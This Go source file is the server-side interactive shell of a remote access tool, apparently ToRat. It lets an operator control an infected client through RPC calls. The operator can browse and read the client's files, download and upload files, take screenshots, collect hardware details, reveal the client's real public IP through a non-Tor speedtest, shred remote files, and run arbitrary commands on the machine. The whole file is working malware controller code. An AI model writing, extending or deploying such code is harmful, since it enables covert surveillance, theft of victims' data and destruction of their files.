package server

import (
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"

	"github.com/abiosoft/ishell"
	"github.com/lu4p/ToRat/shared"
)

// Client side interactive shell menu
func (ac activeClient) shellClient() {
	clientFileCompleter := func([]string) []string {
		return ac.Wd.Files
	}

	serverFileCompleter := func([]string) []string {
		files, err := filepath.Glob("*")
		if err != nil {
			return nil
		}
		return files
	}

	// Set shell and get working dir
	shell := ishell.New()
	r := shared.Dir{}
	err := ac.RPC.Call("API.LS", void, &r)
	if err != nil {
		log.Println("Couldn't list the contents in working directory of the client:", err)
		ac.Wd.Path = "Unknown"
	}
	ac.Wd = r

	shell.SetPrompt(yellow("["+ac.Data().Name+"] ") + blue(ac.Wd.Path) + "$ ")

	commands := []*ishell.Cmd{
		{
			Name: "cd",
			Func: func(c *ishell.Context) {
				ac.Cd(c)
				shell.SetPrompt(yellow("["+ac.Data().Name+"] ") + blue(ac.Wd.Path) + "$ ")
			},
			Completer: clientFileCompleter,
			Help:      "change the working directory of the client",
		},
		{
			Name: "ls",
			Func: ac.ls,
			Help: "list the files in a directory",
		},
		{
			Name:      "cat",
			Func:      ac.Cat,
			Help:      "print the content of a file: usage cat <file>",
			Completer: clientFileCompleter,
		},
		{
			Name:      "shred",
			Func:      ac.Shred,
			Help:      "remove a path by overwriting it with random data then removing it: usage shred <path>",
			Completer: clientFileCompleter,
		},
		{
			Name:      "down",
			Func:      ac.Download,
			Help:      "download a file from the client: usage down <file>",
			Completer: clientFileCompleter,
		},
		{
			Name:      "up",
			Func:      ac.Upload,
			Help:      "upload a file from the cwd of the Server to cwd of the client: usage up <file>",
			Completer: serverFileCompleter,
		},
		{
			Name: "screen",
			Func: ac.Screen,
			Help: "take a screenshot of the client and upload it to the server",
		},
		{
			Name: "escape",
			Func: ac.runCommand,
			Help: "escape a command and run it natively on client",
		},
		{
			Name: "hardware",
			Func: ac.Hardware,
			Help: "collect a systems hardware specs",
		},
		{
			Name: "reconnect",
			Func: func(c *ishell.Context) {
				ac.Reconnect(c)
				shell.Close()
			},
			Help: "tell the client to reconnect",
		},
		{
			Name: "speedtest",
			Func: ac.Speedtest,
			Help: "run a speedtest on a clients native internet connection (non-tor)",
		},
		{
			Name: "exit",
			Func: func(c *ishell.Context) {
				c.Stop()
				shell.Close()
			},
			Help: "background the current session",
		},
	}

	for _, c := range commands {
		shell.AddCmd(c)
	}

	shell.NotFound(ac.runCommand)
	shell.Run()
}

// ls remote directory
func (ac *activeClient) ls(c *ishell.Context) {
	r := shared.Dir{}
	err := ac.RPC.Call("API.LS", void, &r)
	if err != nil {
		c.Println(yellow("["+ac.Data().Name+"] ") + red("[!] Encoutered error during list:", err))
		return
	}
	ac.Wd = r
	for _, f := range ac.Wd.Files {
		c.Println(f)
	}
}

// cat remote file
func (ac *activeClient) Cat(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	var r string
	err := ac.RPC.Call("API.Cat", path, &r)
	if err != nil {
		c.Println(yellow("["+ac.Data().Name+"] ") + red("[!] Could not cat file:", err))
	}
	c.Println(r)
}

// Change remote directory
func (ac *activeClient) Cd(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	r := shared.Dir{}
	err := ac.RPC.Call("API.Cd", path, &r)
	if err != nil {
		c.Println(yellow("["+ac.Data().Name+"] ") + red("[!] Could not change to that path:", err))
	}
	ac.Wd = r
}

// Download a remote file
func (ac *activeClient) Download(c *ishell.Context) {
	var r shared.File
	arg := strings.Join(c.Args, " ")

	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	err := ac.RPC.Call("API.SendFile", arg, &r)
	if err != nil {
		c.ProgressBar().Final(yellow("["+ac.Data().Name+"] ") + red("[!] Download could not be sent to Server:", err))
		c.ProgressBar().Stop()
		return
	}

	dlPath := filepath.Join(ac.Data().Path, r.Fpath)
	dlDir, _ := filepath.Split(dlPath)

	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create directory path:", err))
		c.ProgressBar().Stop()
		return
	}

	if err := ioutil.WriteFile(dlPath, r.Content, 0777); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path:", err))
		c.ProgressBar().Stop()
		return
	}

	c.ProgressBar().Final(green("[Server] ") + green("[+] Download received"))
	c.ProgressBar().Stop()
}

// Upload a file from server to client
func (ac *activeClient) Upload(c *ishell.Context) {
	path := strings.Join(c.Args, " ")
	info, _ := os.Stat(path)

	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	content, err := ioutil.ReadFile(path)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file:", err))
		c.ProgressBar().Stop()
		return
	}

	f := shared.File{
		Content: content,
		Path:    path,
		Perm:    info.Mode(),
	}

	if err := ac.RPC.Call("API.RecvFile", f, &void); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed:", err))
		c.ProgressBar().Stop()
		return
	}

	c.ProgressBar().Final(green("[Server] ") + green("[+] Upload Successful"))
	c.ProgressBar().Final(yellow("["+ac.Data().Name+"] ") + green("[+] Upload successfully received"))
	c.ProgressBar().Stop()
}

// Capture remote screenshot
func (ac *activeClient) Screen(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	filename := getTimeSt() + ".png"
	var r []byte

	if err := ac.RPC.Call("API.Screen", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+ac.Data().Name+"] ") + red("[!] Screenshot failed:", err))
		c.ProgressBar().Stop()
		return
	}

	dlPath := filepath.Join(ac.Data().Path, "/screenshots/", filename)
	dlDir, _ := filepath.Split(dlPath)

	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create screenshots path!"))
		c.ProgressBar().Stop()
		c.Println(green("[Server] ") + red("[!] ", err))
		return
	}

	err := ioutil.WriteFile(dlPath, r, 0777)
	if err != nil {
		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved:", err))
		c.ProgressBar().Stop()
		return
	}
	c.ProgressBar().Final(green("[Server] ") + green("[+] Screenshot received"))
	c.ProgressBar().Stop()
}

// Force client reconnect
// TODO: I don't think this feature works
func (ac *activeClient) Reconnect(c *ishell.Context) {
	var r bool
	ac.RPC.Call("API.Reconnect", void, &r)
	c.Stop()
}

// Hardware print clients hardware info
func (ac *activeClient) Hardware(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()
	r := shared.Hardware{}

	if err := ac.RPC.Call("API.GetHardware", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+ac.Data().Name+"] ") + red("[!] Could not collect information on client hardware:", err))
		c.ProgressBar().Stop()
		return
	}

	c.ProgressBar().Final(yellow("["+ac.Data().Name+"] ") + green("[+] Hardware collection finished"))
	c.ProgressBar().Stop()

	c.Println(green("Runtime:     "), r.Runtime)
	c.Println(green("Arch:        "), r.OSArch)
	c.Println(green("OS:          "), r.OSName)
	c.Println(green("OS Version:  "), r.OSVersion)
	c.Println(green("CPU:         "), r.CPU)
	c.Println(green("CORES:       "), r.Cores)
	c.Println(green("RAM:         "), r.RAM)
	c.Println(green("GPU:         "), r.GPU)
	c.Println(green("Drives:      "), r.Drives)
}

// Shred a remote file
func (ac *activeClient) Shred(c *ishell.Context) {
	s := shared.Shred{
		Path:   strings.Join(c.Args, " "),
		Times:  3,
		Zeros:  true,
		Remove: true,
	}

	if err := ac.RPC.Call("API.Shred", &s, &void); err != nil {
		c.Println(red("[!] Could not shred path", s.Path+":", err))
		return
	}
	c.Println(green("[+] Sucessfully shred path"))
}

// Speedtest the clients internet connection
func (ac *activeClient) Speedtest(c *ishell.Context) {
	c.ProgressBar().Indeterminate(true)
	c.ProgressBar().Start()

	r := shared.Speedtest{}
	if err := ac.RPC.Call("API.Speedtest", void, &r); err != nil {
		c.ProgressBar().Final(yellow("["+ac.Data().Name+"] ") + red("[!] Could not perform speedtest on client:", err))
		c.ProgressBar().Stop()
		return
	}

	c.ProgressBar().Final(yellow("["+ac.Data().Name+"] ") + green("[+] Speedtest finished"))
	c.ProgressBar().Stop()

	c.Println(green("Public IP: "), r.IP)
	c.Println(green("Country:   "), r.Country)
	c.Println(green("Ping:      "), r.Ping)
	c.Println(green("Download:  "), r.Download)
	c.Println(green("Upload:    "), r.Upload)
}

// Run a command on client
func (ac *activeClient) runCommand(c *ishell.Context) {
	command := strings.Join(c.Args, " ")
	var r string
	args := shared.Cmd{
		Cmd:        command,
		Powershell: false,
	}

	if err := ac.RPC.Call("API.RunCmd", args, &r); err != nil {
		c.Println(yellow("["+ac.Data().Name+"] ") + red("[!] Bad or unkown command:", err))
	}

	c.Println(r)
}
